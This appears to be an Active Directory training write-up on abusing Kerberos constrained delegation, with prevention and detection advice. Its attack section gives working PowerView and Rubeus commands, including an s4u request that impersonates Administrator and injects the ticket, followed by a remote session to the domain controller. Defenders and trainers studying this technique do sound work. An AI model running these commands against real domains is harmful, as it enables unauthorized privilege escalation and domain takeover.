## Description

Kerberos Delegation allows an application to access resources hosted on a different server without directly assigning access to the service account. For instance, a web server service account can be delegated to access SQL server service, enabling user access to the database content they are provisioned for without direct database access.

### Types of Delegation in Active Directory
1. **Unconstrained Delegation** - Most permissive, allows delegation to any service.
2. **Constrained Delegation** - Configures user properties to limit services they can delegate to.
3. **Resource-based Delegation** - Configured within the computer object for selective trust, less common in production.

**Security Consideration**: Any type of delegation can pose security risks and should be avoided unless necessary.

## Attack

The example focuses on abusing constrained delegation. When an account is trusted for delegation, it can request Kerberos tickets for other services.

### Example Steps:
1. **Identify Accounts with Constrained Delegation**
   ```powershell
   PS C:\\Users\\bob\\Downloads> Get-NetUser -TrustedToAuth

   Example Output:
   ```plaintext
   distinguishedname : CN=web service,CN=Users,DC=eagle,DC=local
   msds-allowedtodelegateto : {http/DC1.eagle.local/eagle.local, http/DC1.eagle.local}
   useraccountcontrol : TRUSTED_TO_AUTH_FOR_DELEGATION
   ```

2. **Hash the Password** using Rubeus for the compromised account password `Slavi123`.
   ```powershell
   PS C:\\Users\\bob\\Downloads> .\\Rubeus.exe hash /password:Slavi123
   ```

   Example Output:
   ```plaintext
   rc4_hmac : FCDC65703DD2B0BD789977F1F3EEAECF
   ```

3. **Request Kerberos Ticket** for the `Administrator` account using Rubeus.
   ```powershell
   PS C:\\Users\\bob\\Downloads> .\\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt
   ```

4. **Verify Ticket Injection** with `klist`.
   ```powershell
   PS C:\\Users\\bob\\Downloads> klist
   ```

5. **Connect to Domain Controller**.
   ```powershell
   PS C:\\Users\\bob\\Downloads> Enter-PSSession dc1
   ```

## Prevention

1. Set privileged users with the property **Account is sensitive and cannot be delegated**.
2. Add privileged users to the **Protected Users** group, which applies enhanced security against delegation.

**Password Security**: Use cryptographically secure passwords to avoid Kerberoasting attacks.

## Detection

- Correlate users' behavior
- Monitor events with ID 4624 (successful logon)
- Check Transited Services attribute in event logs for S4U logon process
